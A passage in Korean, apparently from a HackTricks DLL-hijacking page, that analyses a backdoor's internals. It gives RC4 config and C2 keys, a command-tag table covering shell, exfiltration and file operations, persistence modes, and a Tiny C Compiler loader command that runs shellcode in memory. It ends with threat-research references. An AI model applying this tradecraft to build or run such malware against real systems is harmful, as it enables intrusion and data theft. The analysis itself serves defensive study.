- 두 번째 리졸버를 사용해 **PEB → InMemoryOrderModuleList**를 순회하고 각 export 테이블을 4바이트 블록으로 Murmur 스타일 믹싱으로 파싱하며, 해시를 찾지 못하면 `GetProcAddress`로만 폴백한다.

내장 구성 및 C2
- 구성은 드롭된 `BluetoothService` 파일의 **offset 0x30808**(크기 **0x980**)에 위치하며 키 `qwhvb^435h&*7`로 RC4 복호화되어 C2 URL과 User-Agent를 드러낸다.
- 비콘은 점으로 구분된 호스트 프로필을 만들고 태그 `4Q`를 선행시킨 뒤 HTTPS로 `HttpSendRequestA`를 호출하기 전에 키 `vAuig34%^325hGV`로 RC4 암호화한다. 응답은 RC4 복호화되어 태그 스위치로 분기된다 (`4T` 쉘, `4V` 프로세스 실행, `4W/4X` 파일 쓰기, `4Y` 읽기/유출, `4\\` 제거, `4` 드라이브/파일 열거 + 청크 전송 등).
- 실행 모드는 CLI 인수로 조절된다: 인수가 없으면 설치(persistence: 서비스/Run 키)를 수행하고 `-i`를 가리킨다; `-i`는 자신을 `-k`로 재실행하며; `-k`는 설치를 건너뛰고 페이로드를 실행한다.

관찰된 대체 로더
- 동일한 침입은 Tiny C Compiler를 드롭하고 `C:\ProgramData\USOShared\`에서 `svchost.exe -nostdlib -run conf.c`를 실행했으며, 옆에 `libtcc.dll`이 있었다. 공격자가 제공한 C 소스는 셸코드를 임베드하여 컴파일되고 PE를 디스크에 쓰지 않고 메모리에서 실행되었다. 다음으로 재현하라:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- 이 TCC 기반의 compile-and-run 단계는 런타임에 `Wininet.dll`을 import했고 하드코딩된 URL에서 second-stage shellcode를 가져와 컴파일러 실행으로 가장하는 유연한 loader를 제공했다.

## 참고자료

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
